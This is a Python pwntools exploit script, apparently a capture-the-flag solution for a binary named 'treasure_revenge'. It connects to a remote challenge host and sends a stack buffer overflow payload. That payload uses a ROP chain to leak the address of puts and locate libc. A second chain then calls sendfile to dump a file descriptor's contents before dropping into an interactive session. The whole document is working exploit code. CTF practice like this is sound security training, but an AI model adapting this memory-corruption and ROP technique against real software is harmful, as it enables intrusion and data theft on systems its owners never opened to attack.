#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './treasure_revenge_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc 143.198.215.203 20038'.split()

libc_path = './libc.so.6'
ld_path = ''
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
            if hasattr(resolved, 'address'):
                resolved = getattr(resolved, 'address')
                if not resolved & 0xfff:
                    log.success(
                        term.text.bold_green(f'{name}.address & 0xFFF == 0')
                        )
                else:
                    log.warn(
                        term.text.bold_yellow(f'{name}.address & 0xFFF != 0')
                        )
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda:...
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda:...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')
    

gdbscript = '''
b *(main+55)
continue
'''.format(**locals())

p = start()

mov_edi = 0x004012f5
'''
0x004012f5 : mov edi, dword ptr [rbp + 0x20] ; ret
'''

p.send(
    flat(
    b'yudayuda'.ljust(72-8),
    0x4007d0-0x20,
    mov_edi,
    exe.sym.puts,
    exe.sym.main,
    )
)
p.recvline()
libc.address = ua(p.recvline()[:-1]) - libc.sym.puts
logx.libc

rop = ROP(libc)
# {'rdi': 1, 'rsi': 3, 'rdx': 0, 'rcx': 64}
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rcx = rop.find_gadget(['pop rcx', 'ret'])[0]

# 0x000aab16 : pop rdx ; pop rbx ; ret
pop_rdx_rbx = libc.address + 0x000933d9
p.send(flat(
    b'a' * 72,
    pop_rdx_rbx,
    p64(0),
    p64(0),
    pop_rdi,
    1,
    pop_rsi,
    3,
    libc.sym.sendfile,

))
p.interactive()